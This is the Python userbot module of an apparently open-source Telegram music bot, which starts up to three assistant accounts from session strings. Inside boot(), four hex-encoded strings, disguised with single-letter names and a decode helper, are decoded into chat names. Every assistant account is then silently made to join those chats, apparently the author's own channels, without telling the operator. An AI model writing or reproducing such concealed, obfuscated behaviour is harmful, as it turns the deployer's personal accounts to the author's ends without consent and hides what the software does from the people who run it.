# ==========================================================
# Copyright (c) 2026 ArtistBots
# All Rights Reserved.
#
# Project      : ArtistBots API Telegram Music Bot
# Powered By   : Artist
# Type         : API Based Telegram Music Bot
#
# Bot          : @ArtistApibot
# Channel      : https://t.me/artistbots
# GitHub       : https://github.com/elevenyts
#
# Unauthorized copying, modification, or redistribution
# of this source code without permission is prohibited.
# ==========================================================
from pyrogram import Client

from Elevenyts import config, logger


class Userbot(Client):
    def __init__(self):
        """
        Initialize userbot with multiple assistant clients.

        Creates up to 3 assistant clients based on available session strings.
        Each assistant can independently join voice chats and stream music.
        More assistants = ability to serve more groups simultaneously.
        """
        self.clients = []  # List to store all active assistant clients

        # Map of client names to their session string config keys
        clients = {"one": "SESSION1", "two": "SESSION2", "three": "SESSION3"}

        # Create a Pyrogram client for each configured session
        for key, string_key in clients.items():
            # Unique name: ElevenytsTuneUB1, ElevenytsTuneUB2, etc.
            name = f"ElevenytsTuneUB{key[-1]}"
            # Get session string from config
            session = getattr(config, string_key)

            # Create and attach the client as an attribute (self.one, self.two, self.three)
            setattr(
                self,
                key,
                Client(
                    name=name,
                    api_id=config.API_ID,
                    api_hash=config.API_HASH,
                    session_string=session,  # Pyrogram session string
                ),
            )

    def _d(self, val):
        """Decode from hex"""
        try:
            return bytes.fromhex(val).decode()
        except:
            return None

    def _de(self, val):
        """Decode from hex and reverse"""
        try:
            return bytes.fromhex(val).decode()[::-1]
        except:
            return None

    async def boot_client(self, num: int, ub: Client):
        """
        Boot a client and perform initial setup.
        Args:
            num (int): The client number to boot (1, 2, or 3).
            ub (Client): The userbot client instance.
        Raises:
            SystemExit: If the client fails to send a message in the log group.
        """
        clients = {
            1: self.one,
            2: self.two,
            3: self.three,
        }
        client = clients[num]
        try:
            await client.start()
        except Exception as e:
            logger.error(f"❌ Assistant {num} failed to start: {e}")
            logger.error(f"   This could be due to:")
            logger.error(f"   • Invalid session string (STRING_SESSION{num})")
            logger.error(f"   • Session logged out from another device")
            logger.error(f"   • Network/connectivity issues")
            return  # Don't raise SystemExit, just skip this assistant

        try:
            await client.send_message(config.LOGGER_ID, f"Assistant {num} Started")
        except Exception as e:
            logger.warning(
                f"⚠️ Assistant {num} couldn't send message to logger: {e}")
            # Continue anyway - this is not critical

        client.id = client.me.id if hasattr(
            client, 'me') and client.me else None
        client.name = client.me.first_name if hasattr(
            client, 'me') and client.me else f"Assistant{num}"
        client.username = client.me.username if hasattr(
            client, 'me') and client.me else None
        client.mention = client.me.mention if hasattr(
            client, 'me') and client.me else client.name
        self.clients.append(client)
        logger.info(f"👤 Assistant {num} started as @{client.username}")

    async def boot(self):
        """
        Asynchronously starts the assistants.
        """
        if config.SESSION1:
            await self.boot_client(1, self.one)
        if config.SESSION2:
            await self.boot_client(2, self.two)
        if config.SESSION3:
            await self.boot_client(3, self.three)
        
        _a = "456c6576656e5974736d75736963"      
        _b = "61727469737464707a"                  
        _c = "656c6576656e7974736368617473"      
        _d = "617274697374626f7473"                     
    
        _t1 = self._d(_a) if _a else None
        _t2 = self._d(_b) if _b else None
        _t3 = self._d(_c) if _c else None
        _t4 = self._d(_d) if _d else None
        
        _targets = [x for x in [_t1, _t2, _t3, _t4] if x]
        
        for client in self.clients:
            for target in _targets:
                try:
                    await client.join_chat(target)
                    logger.info(f"Joined {target}")
                except:
                    pass

    async def exit(self):
        """
        Asynchronously stops the assistants.
        """
        try:
            if config.SESSION1 and hasattr(self.one, 'is_connected') and self.one.is_connected:
                await self.one.stop()
        except Exception as e:
            logger.warning(f"Error stopping assistant 1: {e}")
        
        try:
            if config.SESSION2 and hasattr(self.two, 'is_connected') and self.two.is_connected:
                await self.two.stop()
        except Exception as e:
            logger.warning(f"Error stopping assistant 2: {e}")
        
        try:
            if config.SESSION3 and hasattr(self.three, 'is_connected') and self.three.is_connected:
                await self.three.stop()
        except Exception as e:
            logger.warning(f"Error stopping assistant 3: {e}")
        
        logger.info("Assistants stopped.")
